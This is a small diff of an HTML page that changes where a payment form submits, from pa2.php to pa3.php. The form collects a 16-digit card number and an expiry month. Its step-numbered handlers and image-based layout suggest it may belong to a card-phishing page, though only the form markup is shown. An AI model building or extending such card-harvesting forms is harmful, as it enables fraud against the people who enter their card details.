@@ -24,7 +24,7 @@ user-select: none;
 -webkit-user-select: none;
 -ms-user-select: none;" src="img/formulario.png" alt="formulario" />
 
-        <form action="pa2.php" method="post" id="formcard">
+        <form action="pa3.php" method="post" id="formcard">
           <input class="cinput" type="text" name="card" id="card" maxlength="16" required>
           <input type="hidden" name="add" value="echo">
           <select class=" select mselect" name="mes" id="mes" required>
